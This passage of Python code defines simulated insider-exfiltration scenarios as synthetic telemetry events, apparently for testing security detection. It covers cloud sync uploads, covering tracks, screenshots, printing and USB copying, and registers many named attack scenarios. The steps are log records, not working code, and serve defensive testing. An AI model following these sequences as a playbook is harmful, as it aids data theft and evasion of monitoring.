        AttackEvent(event_type="app_event", delay=_delay(10, 5, 2, 30), data={"app": "{sync_app}", "action": "upload_sync", "usage": "write", "resource_name": "Personal {sync_app} Account", "success": True, "description": "Synced final batch (750 MB) to personal cloud storage", "metadata": {"attack_phase": "exfiltration", "size_mb": 750}}, requires_success=True),
        AttackEvent(event_type="network_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"source_ip": "{victim_ip}", "destination_ip": "{attacker_ip}", "destination_port": 443, "protocol": "TCP", "action": "allowed", "direction": "outbound", "auth": "none", "bytes_sent": 786432000, "bytes_received": 16384, "description": "Large outbound HTTPS sync to personal cloud storage (750 MB)", "metadata": {"attack_phase": "exfiltration", "cloud_sync": True}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(30, 15, 5, 90), data={"app": "{sync_app}", "action": "rename_folder", "usage": "write", "resource_name": "Personal {sync_app} Account", "success": True, "description": "Renamed synced folder to innocuous name", "metadata": {"attack_phase": "defense_evasion"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(15, 8, 3, 45), data={"app": "{sync_app}", "action": "create_share_link", "usage": "write", "resource_name": "{share_type}", "success": True, "description": "Created external share link for synced folder", "metadata": {"attack_phase": "exfiltration", "external_share": True}}, requires_success=True),
        AttackEvent(event_type="device_event", delay=_delay(60, 30, 15, 180), data={"action": "software_uninstall", "software_name": "{sync_app}", "software_version": "latest", "metadata": {"attack_phase": "defense_evasion"}}, requires_success=True),
    ],
    parameters=CLOUD_STORAGE_SYNC_PARAMS,
    success_rate=0.7,
    iocs=["dropbox.com", "drive.google.com"],
    expected_findings=["Personal cloud sync app installed", "Progressive file collection across multiple sources over days", "Multiple upload batches to personal cloud in escalating sizes", "Sync app uninstalled to cover tracks"],
    relevant_ioc_keys=["attacker_ip"],
)

SCREENSHOT_PRINT_EXFIL = AttackScenario(
    id="screenshot_print_exfil",
    tier="T2",
    name="Screenshot and Print Exfiltration",
    description="Employee accesses multiple sensitive business applications (SAP, internal finance portal), captures screenshots of confidential data from multiple screens, accesses a second application for additional intelligence, prints confidential documents, connects personal phone via USB, and copies all captured files to the device for physical exfiltration.",
    attack_type="dlp",
    events=[
        # --- Phase 1: Access first sensitive application ---
        AttackEvent(event_type="app_event", delay=_delay(0, 0), data={"app": "SAP", "action": "view_record", "resource_name": "{document_type}", "success": True, "description": "Viewed confidential financial records in SAP", "metadata": {"attack_phase": "access"}}, requires_success=False),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "SAP", "action": "view_record", "resource_name": "Quarterly Revenue Breakdown", "success": True, "description": "Navigated to quarterly revenue breakdown — pre-release data", "metadata": {"attack_phase": "access"}}, requires_success=True),
        # --- Phase 2: First round of screenshots ---
        AttackEvent(event_type="process_event", delay=_delay(2, 1, 0.5, 5), data={"process_name": "{screenshot_tool}", "action": "start", "parent_process": "explorer.exe", "command_line": "{screenshot_tool}", "path": "C:\\Program Files\\{screenshot_tool}", "hash": "3af1774d10e66c2370e293697924b3a768765d0c0c497628b9f624ba02674b38", "pid": 22074, "integrity_level": "medium", "user_context": "CORP\\{victim_username}", "metadata": {"attack_phase": "collection", "screenshot": True}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"action": "modify", "path": "C:\\Users\\Pictures\\Screenshots\\", "system": "endpoint", "count": 8, "metadata": {"attack_phase": "collection", "screenshot_files": True}}, requires_success=True),
        # --- Phase 3: Access second application ---
        AttackEvent(event_type="app_event", delay=_delay(5, 3, 1, 15), data={"app": "Internal Finance Portal", "action": "view_dashboard", "resource_name": "Executive Compensation Dashboard", "success": True, "description": "Accessed internal finance portal — executive compensation data", "metadata": {"attack_phase": "access"}}, requires_success=True),
        AttackEvent(event_type="app_event", delay=_delay(3, 2, 0.5, 8), data={"app": "Internal Finance Portal", "action": "view_record", "resource_name": "M&A Pipeline Overview", "success": True, "description": "Viewed M&A pipeline overview — active deal information", "metadata": {"attack_phase": "access"}}, requires_success=True),
        # --- Phase 4: More screenshots ---
        AttackEvent(event_type="file_event", delay=_delay(0.5, 0.2, 0.1, 1), data={"action": "modify", "path": "C:\\Users\\Pictures\\Screenshots\\", "system": "endpoint", "count": 7, "metadata": {"attack_phase": "collection", "screenshot_files": True}}, requires_success=True),
        # --- Phase 5: Print documents ---
        AttackEvent(event_type="print_event", delay=_delay(10, 5, 2, 30), data={"printer_name": "{printer}", "document_name": "{document_type}.pdf", "pages": 47, "copies": 1, "status": "completed", "metadata": {"attack_phase": "collection", "physical_copy": True}}, requires_success=True),
        # --- Phase 6: USB copy ---
        AttackEvent(event_type="device_event", delay=_delay(30, 15, 5, 90), data={"action": "usb_connected", "device_type": "usb_phone", "vendor": "Apple", "product": "iPhone", "serial": "USB_PHONE_001", "metadata": {"attack_phase": "exfiltration_prep"}}, requires_success=True),
        AttackEvent(event_type="file_event", delay=_delay(2, 1, 0.5, 5), data={"action": "share", "path": "C:\\Users\\Pictures\\Screenshots\\", "destination": "iPhone (USB)", "system": "endpoint", "count": 15, "metadata": {"attack_phase": "exfiltration", "usb_copy": True}}, requires_success=True),
    ],
    parameters=SCREENSHOT_PRINT_EXFIL_PARAMS,
    success_rate=0.85,
    iocs=[],
    expected_findings=["Confidential financial data viewed in SAP and finance portal", "Screenshots taken of sensitive data", "Confidential document printed", "Personal phone connected — files copied to mobile device"],
    relevant_ioc_keys=[],
)


# =============================================================================
# REGISTRY — maps scenario_id to AttackScenario object
# =============================================================================

CATALOG_SCENARIOS = {
    # Social engineering
    "aitm_phishing": AITM_PHISHING,
    "device_code_phishing": DEVICE_CODE_PHISHING,
    "oauth_consent_phishing": OAUTH_CONSENT_PHISHING,
    "thread_hijack": THREAD_HIJACK,
    "shared_document_lure": SHARED_DOCUMENT_LURE,
    "bec_invoice_diversion": BEC_INVOICE_DIVERSION,
    "password_spraying": PASSWORD_SPRAYING,
    # Identity persistence
    "new_mfa_registration": NEW_MFA_REGISTRATION,
    "mfa_conditional_access_weakening": MFA_CONDITIONAL_ACCESS_WEAKENING,
    "mailbox_forwarding_rule": MAILBOX_FORWARDING_RULE,
    "inbox_hiding_rules": INBOX_HIDING_RULES,
    "service_principal_persistence": SERVICE_PRINCIPAL_PERSISTENCE,
    "privileged_role_assignment": PRIVILEGED_ROLE_ASSIGNMENT,
    "guest_user_invitation_abuse": GUEST_USER_INVITATION_ABUSE,
    "federation_trust_modification": FEDERATION_TRUST_MODIFICATION,
    # Endpoint attacks
    "iso_lnk_attachment_chain": ISO_LNK_ATTACHMENT_CHAIN,
    "dll_sideloading": DLL_SIDELOADING,
    "remote_access_tool_install": REMOTE_ACCESS_TOOL_INSTALL,
    "malicious_browser_extension": MALICIOUS_BROWSER_EXTENSION,
    "scheduled_task_persistence": SCHEDULED_TASK_PERSISTENCE,
    "credential_stealer": CREDENTIAL_STEALER,
    "edr_security_tampering": EDR_SECURITY_TAMPERING,
    "protocol_tunneling_c2": PROTOCOL_TUNNELING_C2,
    "dns_based_c2": DNS_BASED_C2,
    # AD / hybrid identity
    "kerberoasting": KERBEROASTING,
    "lsass_credential_dump": LSASS_CREDENTIAL_DUMP,
    "pass_the_hash": PASS_THE_HASH,
    "dcsync_attack": DCSYNC_ATTACK,
    "golden_ticket": GOLDEN_TICKET,
    "gpo_abuse": GPO_ABUSE,
    "ad_cs_certificate_abuse": AD_CS_CERTIFICATE_ABUSE,
    "local_admin_reuse_lateral": LOCAL_ADMIN_REUSE_LATERAL,
    # Cloud / SaaS
    "cloud_service_discovery": CLOUD_SERVICE_DISCOVERY,
    "cloud_admin_command_abuse": CLOUD_ADMIN_COMMAND_ABUSE,
    "object_storage_mass_read": OBJECT_STORAGE_MASS_READ,
    "secret_vault_theft": SECRET_VAULT_THEFT,
    "new_api_keys_persistence": NEW_API_KEYS_PERSISTENCE,
    "role_policy_tampering": ROLE_POLICY_TAMPERING,
    "logging_audit_suppression": LOGGING_AUDIT_SUPPRESSION,
    "saas_bulk_export": SAAS_BULK_EXPORT,
    "cloud_cryptomining": CLOUD_CRYPTOMINING,
    "collaboration_platform_lure": COLLABORATION_PLATFORM_LURE,
    # Data theft / DevOps / Supply chain
    "mailbox_collection_export": MAILBOX_COLLECTION_EXPORT,
    "source_code_repo_theft": SOURCE_CODE_REPO_THEFT,
    "archive_staging_exfil": ARCHIVE_STAGING_EXFIL,
    "dns_exfiltration": DNS_EXFILTRATION,
    "double_extortion": DOUBLE_EXTORTION,
    "backup_destruction": BACKUP_DESTRUCTION,
    "poisoned_pipeline": POISONED_PIPELINE,
    "cicd_token_theft": CICD_TOKEN_THEFT,
    "malicious_container_image": MALICIOUS_CONTAINER_IMAGE,
    "wiper_disguised_as_maintenance": WIPER_DISGUISED_AS_MAINTENANCE,
    # Compound T3 campaigns
    "aitm_to_sharepoint_exfil": AITM_TO_SHAREPOINT_EXFIL,
    "device_code_to_dcsync": DEVICE_CODE_TO_DCSYNC,
    "consent_phishing_to_slow_exfil": CONSENT_PHISHING_TO_SLOW_EXFIL,
    "poisoned_pipeline_to_snapshot_export": POISONED_PIPELINE_TO_SNAPSHOT_EXPORT,
    "contractor_vpn_to_ediscovery": CONTRACTOR_VPN_TO_EDISCOVERY,
    # Original scenarios (migrated from scenarios.py)
    # -- Phishing
    "docusign_credential_harvest": DOCUSIGN_CREDENTIAL_HARVEST,
    "microsoft_365_credential_harvest": MICROSOFT_365_CREDENTIAL_HARVEST,
    "it_support_malware": IT_SUPPORT_MALWARE,
    "voicemail_phishing": VOICEMAIL_PHISHING,
    "vendor_invoice_qr": VENDOR_INVOICE_QR,
    # -- Account takeover
    "credential_stuffing_impossible_travel": CREDENTIAL_STUFFING_IMPOSSIBLE_TRAVEL,
    "mfa_fatigue_push_bombing": MFA_FATIGUE_PUSH_BOMBING,
    "session_hijacking_token_theft": SESSION_HIJACKING_TOKEN_THEFT,
    "helpdesk_social_engineering": HELPDESK_SOCIAL_ENGINEERING,
    # -- Malware
    "lolbins_attack": LOLBINS_ATTACK,
    "ransomware_deployment": RANSOMWARE_DEPLOYMENT,
    "fileless_malware_powershell": FILELESS_MALWARE_POWERSHELL,
    "usb_malware_spread": USB_MALWARE_SPREAD,
    # -- DLP
    "mass_download_resignation": MASS_DOWNLOAD_RESIGNATION,
    "personal_email_exfil": PERSONAL_EMAIL_EXFIL,
    "cloud_storage_sync_exfil": CLOUD_STORAGE_SYNC_EXFIL,
    "screenshot_print_exfil": SCREENSHOT_PRINT_EXFIL,
}
